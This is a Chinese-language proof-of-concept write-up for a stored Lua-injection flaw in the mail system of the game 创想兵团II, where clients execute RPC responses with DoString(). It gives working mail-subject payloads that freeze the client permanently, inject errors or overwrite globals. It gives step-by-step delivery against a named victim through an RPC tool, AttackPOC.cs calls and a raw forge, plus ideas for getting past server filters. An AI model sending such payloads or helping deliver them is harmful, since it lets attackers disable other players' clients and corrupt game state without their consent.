# 创想兵团II 邮件系统 Lua 注入攻击 POC

## 核心漏洞: Lua-as-Serialization 导致的存储型远程代码执行

### 根因

游戏使用 **Lua 源码** 作为 RPC 数据传输格式。服务端返回的所有 RPC 响应都是 Lua 代码，客户端通过 `DoString()` 执行来"反序列化"数据。

```
服务端返回: list = { emails = { { senderName = "Alice", subject = "Hello", ... } } }
客户端执行: LuaState.DoString(上述字符串)  →  从 LuaState 中读取 list 表
```

**问题**: 如果用户可控字段（邮件主题、邮件内容、发送者名等）中包含双引号 `"`，可以闭合 Lua 字符串，注入任意 Lua 代码。客户端仅做 `data.Replace("\\", "&&")` 处理反斜杠，**不转义双引号**。

### 受影响的代码路径 (3个独立的 DoString 执行点)

```
① LobbyConnection.rpcCallBack (token 0x06001FAA)
   → LuaState.DoString(data)        ← 所有 RPC 响应必经

② UIMail.DealMailList (token 0x060035C2)
   → data.Replace("\\", "&&")       ← 仅处理反斜杠
   → LuaState.DoString(data)        ← 打开邮箱时执行

③ UIMail.GetContent (token 0x060035CC)
   → data.Replace("\\", "&&")
   → LuaState.DoString(data)        ← 阅读邮件时执行
```

---

## 攻击链

```
┌─────────────┐    mail_send RPC     ┌──────────┐    存储邮件     ┌──────────┐
│   攻击者     │ ──────────────────→ │  服务端   │ ────────────→ │  数据库   │
│ subject含Lua │                     │           │               │           │
└─────────────┘                     └──────────┘               └──────────┘
                                         │
                                         │ SM_NotifyRPCMessage
                                         │ cmd="newMail" (零点击推送)
                                         ↓
                                    ┌──────────┐
                                    │  受害者   │ ← newMail 图标亮起
                                    └──────────┘
                                         │
                                         │ 受害者打开邮箱
                                         ↓
                                    mail_list RPC 请求
                                         │
                                         │ 服务端返回 Lua 表:
                                         │ list = { emails = { {
                                         │   senderName = "攻击者",
                                         │   subject = "[PAYLOAD]",
                                         │   ...
                                         │ } } }
                                         ↓
                                    rpcCallBack()
                                    → DoString(data) ← 注入的 Lua 代码执行!
                                    → DealMailList()
                                    → DoString(data) ← 第二次执行!
```

---

## Payload 设计

### 服务端生成的 Lua (正常):
```lua
list = { emails = { { senderName = "Alice", subject = "Hello", lastDay = 30, isOpen = "N", isSysMail = "N", haveAttachment = "N" } } }
```

### 注入后的 Lua (subject = `hi" } } } while true do end --`):
```lua
list = { emails = { { senderName = "Attacker", subject = "hi" } } } while true do end --", lastDay = 30, isOpen = "N", isSysMail = "N", haveAttachment = "N" } } }
```

解析:
- `"hi"` → 合法字符串，闭合 subject
- `} } }` → 关闭 email 表、emails 表、list 表
- `while true do end` → **注入的 Lua 代码，无限循环**
- `--` → Lua 注释，注释掉后面所有残留语法

---

## 三种攻击效果

### 1. 客户端冻结 (持久化 DoS) ← **最具破坏性**
```
subject: hi" } } } while true do end --
```
- 受害者打开邮箱 → UI线程执行无限循环 → 客户端永久冻结
- 必须强制关闭游戏
- **每次打开邮箱都会触发**，邮件无法删除
- 等同于永久禁用受害者的邮件功能

### 2. 错误注入 (功能破坏)
```
subject: hi" } } } error = "msgbox_common_num_1001" --
```
- `rpcCallBack` 检测到 `error` 变量，触发 `UITools.CheckError()`
- 弹出错误对话框，mail_list 回调不执行
- 邮件列表无法正常显示

### 3. 变量覆盖 (游戏状态破坏)
```
subject: hi" } } } _G.hacked = true --
```
- 在 Lua 全局表中注入任意变量
- 可影响后续 Lua 代码执行逻辑

---

## POC 使用方法

### 方法 1: 通过 RpcLabUI 发送 (推荐)

在 RpcLabUI 的 "A) 发送自定义 RPC" 区域:
- **函数名**: `mail_send`
- **参数**:
  - `receiver` = `受害者角色名`
  - `subject` = `hi" } } } while true do end --`
  - `content` = `x" } } while true do end --`
  - `attachment` = (空)

### 方法 2: 通过 AttackPOC.cs 代码调用

```csharp
// 发送冻结邮件
AttackPOC.Attack_MailLuaInjection("受害者角色名", "freeze");

// 先本地验证 payload 语法
AttackPOC.VerifyPayloadLocally("hi\" } } } while true do end --");

// Fuzz 服务端过滤规则
AttackPOC.Attack_MailLuaInjection_FuzzPayloads("受害者角色名");

// 完整演示
AttackPOC.RunFullDemo("受害者角色名");
```

### 方法 3: 通过 Raw Text RPC Forge

如果普通方式被服务端过滤，使用 Raw forge 绕过:
- 在 "原始 Text RPC Forge" 区域
- func: `mail_send`
- body:
```
receiver
受害者角色名
subject
hi" } } } while true do end --
content
x" } } while true do end --
attachment

```

---

## 防御绕过思路

如果服务端过滤了双引号 `"`:
1. **Lua 长字符串**: 尝试 `]]` 闭合 `[[...]]` 格式的字符串
2. **反斜杠**: `\"` → 客户端的 `Replace("\\", "&&")` 会把 `\` 替换掉
3. **Unicode 编码**: 某些 Lua 实现支持 `\u0022` 表示双引号
4. **参数走私**: 通过换行注入其他字段名来改变 Lua 表结构

---

## 影响评估

| 维度 | 评级 |
|------|------|
| 攻击复杂度 | **低** - 只需发送一封邮件 |
| 用户交互 | **最低** - 受害者只需打开邮箱（有 newMail 提示诱导） |
| 影响范围 | **高** - 可对任意已知角色名的玩家发起攻击 |
| 持久性 | **高** - 邮件存储在服务端，每次打开邮箱都触发 |
| 可检测性 | **低** - 邮件内容看起来像正常文本 |
